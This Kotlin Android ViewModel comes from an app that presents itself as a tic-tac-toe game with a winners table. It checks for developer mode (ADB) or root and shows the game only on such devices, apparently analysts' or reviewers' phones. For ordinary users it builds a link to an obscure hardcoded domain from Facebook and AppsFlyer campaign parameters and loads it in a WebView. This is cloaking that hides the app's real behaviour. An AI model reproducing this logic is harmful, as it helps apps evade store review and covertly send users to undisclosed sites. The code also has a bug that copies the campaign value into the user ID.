package com.example.beverly_hills_company_test_task.domain

import android.content.Context
import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.example.beverly_hills_company_test_task.data.get.AdbRepos
import com.example.beverly_hills_company_test_task.data.get.AppsFlyerRepos
import com.example.beverly_hills_company_test_task.data.get.FacebookRepos
import com.example.beverly_hills_company_test_task.data.get.Getter
import com.example.beverly_hills_company_test_task.data.get.RootRepos
import com.example.beverly_hills_company_test_task.data.prefs.SharedPrefs
import com.example.beverly_hills_company_test_task.data.records.RecordItem
import com.example.beverly_hills_company_test_task.data.records.RecordRepos
import com.example.beverly_hills_company_test_task.presentation.ui.screens.Player
import com.onesignal.OneSignal
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.combine
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject

@HiltViewModel
class AppViewModel @Inject constructor(
    private val prefs: SharedPrefs,
    private val facebookRepos: FacebookRepos,
    private val recordsRepos: RecordRepos
) : ViewModel() {
    private lateinit var appsFlyerRepository: AppsFlyerRepos
    private val domain = "https://divvyuqduv.online/PtyQ47?"

    private val _urlToLoad = MutableStateFlow(prefs.getSavedLink())
    val urlToLoad: StateFlow<String> = _urlToLoad.asStateFlow()

    private val _getterState = MutableStateFlow(Getter())
    private val getterState: StateFlow<Getter> = _getterState.asStateFlow()

    private val _deeplinkOriginalCollected = MutableStateFlow("")
    private val deeplinkOriginalCollected: StateFlow<String> =
        _deeplinkOriginalCollected.asStateFlow()

    private val _deeplinkListState = MutableStateFlow<List<String>?>(listOf())
    private val deeplinkListState: StateFlow<List<String>?> = _deeplinkListState.asStateFlow()

    private val _records = MutableStateFlow<List<RecordItem>>(emptyList())
    val records: StateFlow<List<RecordItem>> = _records.asStateFlow()
    private suspend fun initAppsFlyer(contextFun: Context) {
        appsFlyerRepository = AppsFlyerRepos(context = contextFun)

        appsFlyerRepository.initAppsFlyer { appsFlyerUID ->
            updateGetterStateAppsFlyerUID(appsFlyerUID = appsFlyerUID)
        }
        viewModelScope.launch(Dispatchers.IO) {
            appsFlyerRepository.appsFlyerData
                .collect { data ->
                    if (data != null) {
                        updateGetterStateAppsFlyer(data)
                    }
                }
        }
    }

    private fun updateGetterStateAppsFlyer(data: Map<String, String>) {
        _getterState.update { currentState ->
            currentState.copy(
                campaign = data["campaign"] ?: currentState.campaign,
                appsFlyerUID = data["campaign"] ?: currentState.appsFlyerUID,
            )
        }
    }

    private fun updateGetterStateAppsFlyerUID(appsFlyerUID: String) {
        _getterState.update { currentState ->
            currentState.copy(appsFlyerUID = appsFlyerUID)
        }
    }

    private fun getDeepLink() {
        viewModelScope.launch(Dispatchers.IO) {
            combine(
                facebookRepos.deepLinkState,
                appsFlyerRepository.campaignState
            ) { fbDeeplink, appsFlyerCampaign ->
                when {
                    !fbDeeplink.isNullOrBlank() -> {
                        _deeplinkOriginalCollected.value = fbDeeplink
                        Log.d("MYLOG", "fbDeeplink: $fbDeeplink")
                        Log.d(
                            "MYLOG",
                            "_deeplinkOriginalCollected.value: ${_deeplinkOriginalCollected.value}"
                        )
                        fbDeeplink.split("://").getOrNull(1)?.split("_")
                    }

                    !appsFlyerCampaign.isNullOrBlank() && appsFlyerCampaign != "null" -> {
                        appsFlyerCampaign.split("_")
                    }

                    else -> {
                        null
                    }
                }
            }.collect { result ->
                _deeplinkListState.value = result
            }
        }
    }

    fun launchFetchingData(
        context: Context,
        onGameOpen: () -> Unit,
        onWebViewOpen: () -> Unit,
    ) {
        viewModelScope.launch(Dispatchers.IO) {
            initAppsFlyer(contextFun = context)
            facebookRepos.initFacebook(context = context)
            getDeepLink()
                initDeveloperMode(context = context) {
                    onGameOpen()
                }
                initRootMode() {
                    onGameOpen()
                }
            setDomain(domain = domain)
            startBuildLink {
                onWebViewOpen()
            }
        }
    }

    private suspend fun initDeveloperMode(context: Context, onGameOpen: () -> Unit) {
        val developerMode = AdbRepos().checkAdb(context)
        updateGetterAdbMode(developerMode)
        if (developerMode) {
            withContext(Dispatchers.Main) {
                onGameOpen()
            }
        }
    }
    private suspend fun initRootMode(onGameOpen: () -> Unit) {
        val rootMode = RootRepos().isDeviceRooted()
        updateGetterRootMode(rootMode)
        if (rootMode) {
            withContext(Dispatchers.Main) {
                onGameOpen()
            }
        }
    }

    private fun updateGetterAdbMode(adbMode: Boolean) {
        _getterState.update { currentState ->
            currentState.copy(adbMode = adbMode)
        }
    }
    private fun updateGetterRootMode(rootMode: Boolean) {
        _getterState.update { currentState ->
            currentState.copy(rootMode = rootMode)
        }
    }

    private fun setDomain(domain: String) {
        _getterState.update { currentState ->
            currentState.copy(
                domain = domain,
            )
        }
    }

    private fun startBuildLink(onWebViewOpen: () -> Unit) {
        viewModelScope.launch(Dispatchers.IO) {
            combine(
                facebookRepos.isFacebookInited,
                appsFlyerRepository.isAppsFlyerInited
            ) { facebook, appsflyer ->
                Log.d("MYLOG", "facebook: $facebook appsflyer: $appsflyer")
                facebook && appsflyer
            }.collect { allInited ->
                if (allInited) {
                    printLinksGetter {
                        onWebViewOpen()
                    }
                }
            }
        }
    }

    private fun printLinksGetter(onWebViewOpen: () -> Unit) {
        viewModelScope.launch(Dispatchers.IO) {
            val builder = StringBuilder()

            OneSignal.setExternalUserId(getterState.value.appsFlyerUID)

            Log.d("MYLOG", "KEK 01")

            builder.append(getterState.value.domain)
            if (!deeplinkListState.value.isNullOrEmpty()) {
                for (i in 0 until deeplinkListState.value!!.size) {
                    builder.append("sub")
                    builder.append("${i+1}")
                    builder.append("=")
                    builder.append(deeplinkListState.value!![i])
                    deeplinkListState?.let {
                        if (i < deeplinkListState.value!!.size - 1) {
                            builder.append("&")
                        }
                    }

                }
            } else {
                builder.append("sub1=null&empty_links")
            }

            val finalLink = builder.toString()
            prefs.setSavedLink(finalLink)

           _urlToLoad.value = finalLink


            withContext(Dispatchers.Main) {
                onWebViewOpen()
            }
        }
    }

    fun loadRecords() {
        viewModelScope.launch(Dispatchers.IO) {
                _records.value = recordsRepos.getAllRecords().first()
        }
    }

    fun saveRecords(winner: Player) {
        if (records.value.size >= 10) {
            viewModelScope.launch(Dispatchers.IO) {
                val lastRecord = recordsRepos.getLastRecord()
                if (lastRecord != null) {
                    recordsRepos.delete(lastRecord)
                }
            }
        }
        val allRecords = records.value
        for (record in allRecords) {
            val updatedRecord = record.copy(place = record.place + 1)
            viewModelScope.launch(Dispatchers.IO) {
                recordsRepos.update(updatedRecord)
            }
        }

        val currentDate = Date(System.currentTimeMillis())
        val dateFormat = SimpleDateFormat("dd-MM-yy", Locale.getDefault())
        val timeFormat = SimpleDateFormat("HH:mm", Locale.getDefault())
        val dateStr = dateFormat.format(currentDate)
        val timeStr = timeFormat.format(currentDate)
        val newRecord = RecordItem(
            place = 1,
            date = dateStr,
            time = timeStr,
            winner = saveWinner(winner = winner)
        )
        viewModelScope.launch(Dispatchers.IO) {
            recordsRepos.insert(newRecord)
        }
        loadRecords()
    }
    private fun saveWinner(winner: Player): String {
        return when (winner) {
            Player.X -> "X"
            Player.O -> "O"
            else -> "DRAW"
        }
    }
}